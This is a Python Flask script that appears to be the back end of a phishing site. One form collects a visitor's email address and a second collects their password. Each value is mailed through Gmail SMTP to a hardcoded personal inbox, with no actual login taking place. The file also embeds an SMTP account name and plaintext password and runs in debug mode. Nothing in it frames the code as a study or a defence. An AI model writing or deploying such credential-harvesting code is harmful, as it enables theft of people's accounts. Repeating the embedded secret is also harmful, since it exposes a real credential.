from flask import Flask,render_template,redirect,url_for,request
from flask_mail import Mail, Message

#init app
app=Flask(__name__)
app=Flask(__name__,template_folder='templates')
mail = Mail(app) # instantiate the mail class
   
# configuration of mail
app.config['MAIL_SERVER']='smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = 'themathgators@gmail.com'
app.config['MAIL_PASSWORD'] = 'qwerty123456789!'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
mail = Mail(app)


@app.route('/',methods=['GET','POST'])
def email_getter():
    if request.method=='POST':
        email=request.form['email']

        msg = Message(
                    'Hello',
                    sender ='themathgators@gmail.com',
                    recipients = ['burhanuddinmshabbir@gmail.com']
                )
        msg.body = 'Email: {}'.format(email)
        mail.send(msg)
        return redirect(url_for('password_getter'))
    else:
        context={} #add data if any
        return render_template('index.html',data=context)

@app.route('/password',methods=['GET','POST',])
def password_getter():
    if request.method=='POST':
        password=request.form['password']

        msg = Message(
                    'Hello',
                    sender ='themathgators@gmail.com',
                    recipients = ['burhanuddinmshabbir@gmail.com']
                )
        msg.body = 'Password: {}'.format(password)
        mail.send(msg)

    context={}
    return render_template('password.html',data=context)

if __name__ == "__main__":
    app.run(debug=True)
